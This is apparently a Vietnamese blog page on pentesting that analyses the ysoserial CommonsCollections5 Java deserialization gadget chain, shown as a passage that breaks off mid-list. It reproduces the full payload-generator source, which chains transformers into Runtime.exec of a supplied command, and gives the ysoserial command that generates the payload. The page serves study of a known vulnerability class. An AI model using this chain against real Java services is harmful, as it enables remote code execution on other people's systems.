@@ -1,0 +1,322 @@
+<!DOCTYPE html><html lang="[&quot;en&quot;,&quot;vi&quot;,&quot;default&quot;]" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Ysoserial Commons Collections 5 Analyst | Phat Mai Blog</title><meta name="author" content="Phat Mai"><meta name="copyright" content="Phat Mai"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Ysoserial Commons Collections 5 AnalystTổng quan CommonsCollections 5 trong YsoserialCommonsCollections là một trong những gadget chain nổi tiếng nhất trong các cuộc tấn công khai thác Java deserializ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ysoserial Commons Collections 5 Analyst">
+<meta property="og:url" content="https://pzhat.github.io/2025/11/15/2025-11-07-Ysoserial-CC5/index.html">
+<meta property="og:site_name" content="Phat Mai Blog">
+<meta property="og:description" content="Ysoserial Commons Collections 5 AnalystTổng quan CommonsCollections 5 trong YsoserialCommonsCollections là một trong những gadget chain nổi tiếng nhất trong các cuộc tấn công khai thác Java deserializ">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pzhat.github.io/img/butterfly-icon.png">
+<meta property="article:published_time" content="2025-11-14T19:34:38.244Z">
+<meta property="article:modified_time" content="2025-11-14T18:34:24.184Z">
+<meta property="article:author" content="Phat Mai">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="ysoserial">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pzhat.github.io/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Ysoserial Commons Collections 5 Analyst",
+  "url": "https://pzhat.github.io/2025/11/15/2025-11-07-Ysoserial-CC5/",
+  "image": "https://pzhat.github.io/img/butterfly-icon.png",
+  "datePublished": "2025-11-14T19:34:38.244Z",
+  "dateModified": "2025-11-14T18:34:24.184Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Phat Mai",
+      "url": "https://pzhat.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://pzhat.github.io/2025/11/15/2025-11-07-Ysoserial-CC5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Ysoserial Commons Collections 5 Analyst',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Phat Mai Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Ysoserial Commons Collections 5 Analyst</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">Ysoserial Commons Collections 5 Analyst</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-11-14T18:34:24.184Z" title="Updated 2025-11-15 01:34:24">2025-11-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/">pentesting</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/Web-Exploitation/">Web-Exploitation</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Ysoserial-Commons-Collections-5-Analyst"><a href="#Ysoserial-Commons-Collections-5-Analyst" class="headerlink" title="Ysoserial Commons Collections 5 Analyst"></a>Ysoserial Commons Collections 5 Analyst</h1><h3 id="Tong-quan-CommonsCollections-5-trong-Ysoserial"><a href="#Tong-quan-CommonsCollections-5-trong-Ysoserial" class="headerlink" title="Tổng quan CommonsCollections 5 trong Ysoserial"></a>Tổng quan CommonsCollections 5 trong Ysoserial</h3><p><code>CommonsCollections</code> là một trong những gadget chain nổi tiếng nhất trong các cuộc tấn công khai thác <code>Java deserialization</code> không an toàn, đặc biệt khi ứng dụng sử dụng thư viện <code>Apache Commons Collections</code>.</p>
+<p>Trong bài viết này, chúng ta sẽ tập trung vào <code>CommonsCollections5 (CC5)</code> — một trong các chain được tích hợp sẵn trong công cụ <code>ysoserial</code> . Mình chọn phân tích CC5 vì đây là chain được nhiều người đề xuất để học do tính minh bạch và dễ debug.</p>
+<p><img src="https://hackmd.io/_uploads/BkTHHfY1bg.png" alt="image"></p>
+<h3 id="Thiet-lap-moi-truong"><a href="#Thiet-lap-moi-truong" class="headerlink" title="Thiết lập môi trường"></a>Thiết lập môi trường</h3><p>Mở dự án ysoserial trong IntelliJ IDEA (hoặc IDE tương đương). Yêu cầu:</p>
+<ul>
+<li>JDK 8</li>
+<li>Thư viện commons-collections:3.1</li>
+</ul>
+<p>Mở Ysoserial project sau khi tải từ github link ở đây:</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
+<p>Ở đây mình sử dụng <code>IntelliJ</code> để tiến hành test và debug.</p>
+<p><img src="https://hackmd.io/_uploads/SyywUfKkbl.png" alt="image"></p>
+<p>Khi vừa mở lên thì ta có thể thấy được <code>GadgetChain</code> được giới thiệu sẵn ở đây và kèm với đó là điều kiện để có thể chạy được để nó gen ra payload ở đây ta sẽ dùng <code>JDK 8</code>.</p>
+<p><img src="https://hackmd.io/_uploads/HJj2UzKkWx.png" alt="image"></p>
+<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Gadgets;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.JavaVersion;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"><span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;, &quot;unchecked&quot;&#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest</span> ( precondition = <span class="string">&quot;isApplicableJavaVersion&quot;</span>)</span><br><span class="line"><span class="meta">@Dependencies(&#123;&quot;commons-collections:commons-collections:3.1&quot;&#125;)</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.MATTHIASKAISER, Authors.JASINNER &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections5</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;BadAttributeValueExpException&gt; &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> BadAttributeValueExpException <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		<span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; command &#125;;</span><br><span class="line">		<span class="comment">// inert chain for setup</span></span><br><span class="line">		<span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">		        <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;);</span><br><span class="line">		<span class="comment">// real chain for after setup</span></span><br><span class="line">		<span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">					String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">					<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">					Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">					<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">					<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, execArgs),</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">		<span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">		<span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        Reflections.setAccessible(valfield);</span><br><span class="line">		valfield.set(val, entry);</span><br><span class="line"></span><br><span class="line">		Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> val;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		PayloadRunner.run(CommonsCollections5.class, args);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isApplicableJavaVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> JavaVersion.isBadAttrValExcReadObj();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Khi ta chạy được lệnh <code>java -jar ysoserial.jar CommonsCollections5 &quot;calc.exe&quot;</code> payload được tạo ra và khi victim deserializes nó, calc.exe sẽ được thực thi.</p>
+<p><img src="https://hackmd.io/_uploads/H1Nh2MKJ-l.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/r1APazYkWe.png" alt="image"></p>
+<p>Vậy là ta chắc chắn rằng nó chạy được không vấn đề gì nên ta sẽ đi vào phân tích và debug gadget.</p>
+<h3 id="Phan-tich-tung-phan-va-Debug"><a href="#Phan-tich-tung-phan-va-Debug" class="headerlink" title="Phân tích từng phần và Debug"></a>Phân tích từng phần và Debug</h3><p>Theo như comment thì ta có đống <code>gadget</code> như sau : </p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">        ObjectInputStream.readObject()</span><br><span class="line">            BadAttributeValueExpException.readObject()</span><br><span class="line">                TiedMapEntry.toString()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure>
+
+<p><code>ObjectInputStream.readObject()</code> thì không có gì để nói vì nó chỉ để thực hiện read object đã được serialize nên ta đi vào gadget luôn. Ta tới với gadget 1 –&gt; 2 : </p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Gadget 1:BadAttributeValueExpException.readObject() --&gt; Gadget 2:TiedMapEntry.toString()</span><br></pre></td></tr></table></figure>
+
+<h4 id="BadAttributeValueExpException-readObject-–-TiedMapEntry-toString"><a href="#BadAttributeValueExpException-readObject-–-TiedMapEntry-toString" class="headerlink" title="BadAttributeValueExpException.readObject() –&gt; TiedMapEntry.toString()"></a>BadAttributeValueExpException.readObject() –&gt; TiedMapEntry.toString()</h4><p>Class <code>BadAttributeValueExpException</code> (package javax.management) được thiết kế để ném exception khi giá trị thuộc tính JMX không hợp lệ.<br>Tuy nhiên, phương thức <code>readObject()</code> của nó ghi đè phương thức mặc định và gọi <code>.toString()</code> trên trường val nếu:</p>
+<ul>
+<li>val !&#x3D; null</li>
+<li>val không phải là String</li>
+</ul>
+<p>Và một số điều kiện về <code>SecurityManager</code> hoặc kiểu dữ liệu<br>Trong payload, ta gán <code>val = new TiedMapEntry(lazyMap, &quot;foo&quot;)</code> → không phải String → .toString() được gọi.</p>
+<p>Đây chính là điểm khởi phát của toàn bộ chuỗi! </p>
+<p><img src="https://hackmd.io/_uploads/H10sacFyZg.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/SJiBysK1Ze.png" alt="image"></p>
+<p>Điều kiện để <code>valObj</code> được gọi lần lượt là : </p>
+<ul>
+<li>valObj <code>!= null</code>.</li>
+<li>valObj <code>không phải String</code>.</li>
+<li>HOẶC <code>System.getSecurityManager() == null</code>.</li>
+<li>HOẶC <code>valObj là primitive wrapper</code> (Long, Integer, etc.)</li>
+</ul>
+<p>Bây giờ ta sẽ đặt breakpoint ngay tại đoạn <code>Object valObj = gf.get(&quot;val&quot;, null)</code> và <code>val = valObj.toString()</code> và tiến hành debug từng bước xem nó sẽ gọi tới đâu.</p>
+<p><img src="https://hackmd.io/_uploads/rkCKesFk-g.png" alt="image"></p>
+<p>Có thể thấy rằng khi đặt breakpoint ở line 72 và thực thi thì <code>valObj</code> bây giờ là một object nằm bên trong <code>TiedMapEntry</code>.</p>
+<p><img src="https://hackmd.io/_uploads/r1aBVjFJWe.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/BJydEst1Zx.png" alt="image"></p>
+<p>Sau đó sau khi đi từ breakpoint ở dòng 86 thì <code>valObj</code> được gọi đến bên <code>toString</code> của class <code>TiedMapEntry</code> .</p>
+<p><img src="https://hackmd.io/_uploads/SkS-8oFybl.png" alt="image"></p>
+<h4 id="TiedMapEntry-–-LazyMap-get"><a href="#TiedMapEntry-–-LazyMap-get" class="headerlink" title="TiedMapEntry() –&gt; LazyMap.get()"></a>TiedMapEntry() –&gt; LazyMap.get()</h4><p>Ta sẽ tiến hành tiếp tục phân tích gadget thứ 2 là từ <code>TiedMapEntry()</code> tới <code>LazyMap.get()</code>.</p>
+<p><img src="https://hackmd.io/_uploads/rJ0YPjtyZx.png" alt="image"></p>
+<p>Ở class <code>TiedMapEntry.java</code> ta có thể thấy rằng nó call 2 giá trị đó là <code>getKey()</code> và <code>getValue()</code>.</p>
+<p>Đầu tiên ta sẽ thử click rồi follow method <code>getKey()</code> xem thử nó có gì.</p>
+<p><img src="https://hackmd.io/_uploads/BkcmPhFy-l.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/B1IEvnY1Zg.png" alt="image"></p>
+<p>Có vẻ không có gì nó chỉ là get key từ object key không có gì để phân tích nên ta sẽ follow method <code>getValue()</code>.</p>
+<p><img src="https://hackmd.io/_uploads/BkEFDnFk-l.png" alt="image"></p>
+<p>Thấy được rằng <code>getValue()</code> có gọi đến map nên ta sẽ set một cái breakpoint nằm ở ngay đoạn <code>getValue()</code>.</p>
+<p><img src="https://hackmd.io/_uploads/r1Mxd2ty-l.png" alt="image"></p>
+<p>Ồ ta thấy rằng nó gọi đến class <code>LazyMap</code> là một trong gadget của ta cần tới tiếp tục follow để xem nó có gọi đến <code>LazyMap.get</code> không.</p>
+<p><img src="https://hackmd.io/_uploads/Bk-jd3FkZg.png" alt="image"></p>
+<p>Chuẩn theo gadget ta xác định được nó call đến <code>LazyMap.get</code> .</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// Nếu map chưa có key này</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="comment">// Tạo value bằng transformer</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        <span class="comment">// Lưu vào map</span></span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Nếu có rồi thì return bình thường</span></span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/r1Nmt2tkbl.png" alt="image"></p>
+<p>Luồng xử lý nó đơn giản chỉ là : </p>
+<ul>
+<li>getKey() → trả về “foo” (không có gì đặc biệt)</li>
+<li>getValue() → gọi map.get(key) → đây chính là LazyMap.get(“foo”)</li>
+<li>Vì “foo” chưa tồn tại trong LazyMap, phương thức get() sẽ:</li>
+<li>Gọi factory.transform(“foo”)</li>
+<li>Lưu kết quả vào map</li>
+<li>Trả về giá trị đó<br>→ factory ở đây là ChainedTransformer, nên transform() sẽ được gọi.</li>
+</ul>
+<p>Đã nạp key vào <code>LazyMap</code> bây giờ ta đã đi đến cuối gadget 2 bây giờ đi tiếp gadget tiếp theo.</p>
+<p><img src="https://hackmd.io/_uploads/SJcro3KJbe.png" alt="image"></p>
+<h4 id="LazyMap-get-–-ChainedTransformer-transform"><a href="#LazyMap-get-–-ChainedTransformer-transform" class="headerlink" title="LazyMap.get() –&gt; ChainedTransformer.transform()"></a>LazyMap.get() –&gt; ChainedTransformer.transform()</h4><p>Ta bay vào class <code>LazyMap</code> sau đó tìm được hàm <code>get</code> của nó sau đó tiến hành set thêm 1 cái breakpoint ở đây xem luồng xử lý nó sẽ như thế nào.</p>
+<p><img src="https://hackmd.io/_uploads/r1hbiy9yWe.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/B1v7ok9J-l.png" alt="image"></p>
+<p>Rồi ở đây ta thấy nó đã chạy xuống dưới là hàm : </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br></pre></td></tr></table></figure>
+
+<p>Ở đây giá trị key đã có và được gán là <code>foo</code> nên điều kiện đúng và nó chạy đúng theo gadget. Trong ysoserial, <code>factory</code> được set thành <code>ChainedTransformer</code> và ta thấy rằng ở đây rằng hàm <code>ChainedTransformer</code> đã được gọi lên để ghép vào phần gadget này.</p>
+<h4 id="ChainedTransformer-transform-–-Phan-con-lai"><a href="#ChainedTransformer-transform-–-Phan-con-lai" class="headerlink" title="ChainedTransformer.transform() –&gt; Phần còn lại"></a>ChainedTransformer.transform() –&gt; Phần còn lại</h4><p>Như ở phần giới thiệu đã nói ngay sau <code>LazyMap.get()</code> là một chuỗi <code>transform</code> bao gồm : </p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ChainedTransformer.transform()</span><br><span class="line"> ConstantTransformer.transform()</span><br><span class="line">  InvokerTransformer.transform()</span><br><span class="line">   Method.invoke()</span><br><span class="line">    Class.getMethod()</span><br><span class="line">     InvokerTransformer.transform()</span><br><span class="line">      Method.invoke()</span><br><span class="line">       Runtime.getRuntime()</span><br><span class="line">        InvokerTransformer.transform()</span><br><span class="line">         Method.invoke()</span><br><span class="line">          Runtime.exec()</span><br></pre></td></tr></table></figure>
+
+<p>Từ cái breakpoint trước ta tiếp tục chạy nó đưa ta vào hàm <code>public Object transform(Object object)</code>.</p>
+<p><img src="https://hackmd.io/_uploads/SJuip1qJbe.png" alt="image"></p>
+<p>Ở đây ta có thể thấy trong method <code>transform</code> của chain này nó sẽ tiến hành loop hết các giá trị bên trong <code>i.Transformers</code> sau đó thực hiện gán nó vào Object và return về có thể coi rằng bước loop này chính là chain mọi cái transform lại với nhau.</p>
+<p><img src="https://hackmd.io/_uploads/ry6cR1cJ-l.png" alt="image"></p>
+<p><code>this.iTransformers[]</code> trong gadgetchain này được set cho các giá trị lần lượt là:</p>
+<ul>
